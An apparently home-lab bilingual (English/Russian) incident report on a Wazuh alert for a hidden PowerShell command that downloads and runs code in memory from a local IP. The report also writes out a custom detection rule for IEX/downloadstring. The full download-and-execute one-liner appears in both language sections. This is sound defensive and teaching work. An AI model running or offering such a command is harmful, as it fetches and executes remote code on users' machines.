# Incident Report: Suspicious PowerShell Execution (T1059.001)
[English](#english) | [Русский](#русский)

---

### English

## 1. Alert Details
*   **Rule ID:** 92027 (Base) / 100200 (Custom)
*   **Severity:** Level 4 (Base) -> Level 12 (Custom after tuning)
*   **Description:** Powershell process spawned powershell instance / Suspicious PowerShell DownloadString execution
*   **MITRE ATT&CK:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)
*   **Agent:** WIN10-PC (192.168.56.110)

## 2. Detection & Analysis
The endpoint (WIN10-PC) executed the following command (captured by Sysmon Event ID 1):
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.103/'))"
```

## 3. Analysis

*   **-nop (NoProfile) and -w hidden are common evasion techniques used by attackers to hide the execution window.**
*   **IEX (Invoke-Expression) combined with downloadstring indicates an attempt to download and execute code directly in memory (fileless malware technique).**
*   **The destination IP (192.168.56.103) is a local SIEM server, presented as an example**
*   **Verdict: True Positive. The activity strongly indicates malicious intent (C2 beaconing / payload execution).**

## 4. Remediation
Initially, Wazuh triggered Rule 92027 (Level 4), which only detected the PowerShell-in-PowerShell behavior but did not flag the malicious arguments.
To improve detection capabilities, a custom rule was created in /var/ossec/etc/rules/local_rules.xml to explicitly hunt for IEX and downloadstring patterns, raising the severity to Level 12.




<img src="https://drive.google.com/uc?export=view&id=1kSv_ZzLCGVzfjXV3gvl9YdD_dNhcE_it" alt="" width="1000" />

MITTRE:

<img src="https://drive.google.com/uc?export=view&id=11FBnN-ZV-pnr_u7JB8_-qy0zk4PuwPWB" alt="" width="1000" />


```xml
<group name="sysmon,sysmon_eid1_detections,windows,local,">
  <!-- Custom rule for Suspicious PowerShell IEX DownloadString -->
  <rule id="100200" level="12">
    <if_sid>92027</if_sid> <!-- Если сработало базовое правило запуска PowerShell -->
    <field name="win.eventdata.commandLine">IEX|downloadstring</field>
    <description>Critical: Suspicious PowerShell DownloadString execution (Possible C2)</description>
    <mitre>
      <id>T1059.001</id>
      <id>T1105</id>
    </mitre>
  </rule>
</group>
```

---

### Русский
# Отчёт об инциденте: Подозрительное выполнение PowerShell (T1059.001)

## 1. Детали алерта
*   **ID правила:** 92027 (базовое) / 100200 (пользовательское)
*   **Уровень критичности:** Level 4 (базовый) -> Level 12 (пользовательский после настройки)
*   **Описание:** Процесс PowerShell породил экземпляр PowerShell / Подозрительное выполнение PowerShell DownloadString
*   **MITRE ATT&CK:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)
*   **Агент:** WIN10-PC (192.168.56.110)

## 2. Обзор инцидента
Конечная точка (WIN10-PC) выполнила следующую команду (зафиксировано Sysmon Event ID 1):
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.103/'))"
```

## 3. Расследование и анализ

*   **-nop (NoProfile) и -w hidden — распространённые техники обхода защиты, используемые злоумышленниками для скрытия окна выполнения.**
*   **IEX (Invoke-Expression) в сочетании с downloadstring указывает на попытку загрузить и выполнить код непосредственно в памяти (техника бесфайлового вредоносного ПО).**
*   **IP-адрес назначения (192.168.56.103) — это локальный SIEM-сервер, приведённый в качестве примера.**
*   **Вердикт: True Positive. Активность явно указывает на вредоносный умысел (сигналы C2 / выполнение полезной нагрузки).**

## 4. Устранение
Изначально Wazuh сработал по правилу 92027 (Level 4), которое обнаруживало только поведение «PowerShell внутри PowerShell», но не помечало вредоносные аргументы.
Для улучшения возможностей обнаружения было создано пользовательское правило в `/var/ossec/etc/rules/local_rules.xml`, чтобы явно искать шаблоны IEX и downloadstring, повысив критичность до Level 12.




<img src="https://drive.google.com/uc?export=view&id=1kSv_ZzLCGVzfjXV3gvl9YdD_dNhcE_it" alt="" width="1000" />

MITRE:

<img src="https://drive.google.com/uc?export=view&id=11FBnN-ZV-pnr_u7JB8_-qy0zk4PuwPWB" alt="" width="1000" />


```xml
<group name="sysmon,sysmon_eid1_detections,windows,local,">
  <!-- Custom rule for Suspicious PowerShell IEX DownloadString -->
  <rule id="100200" level="12">
    <if_sid>92027</if_sid> <!-- Если сработало базовое правило запуска PowerShell -->
    <field name="win.eventdata.commandLine">IEX|downloadstring</field>
    <description>Critical: Suspicious PowerShell DownloadString execution (Possible C2)</description>
    <mitre>
      <id>T1059.001</id>
      <id>T1105</id>
    </mitre>
  </rule>
</group>
```
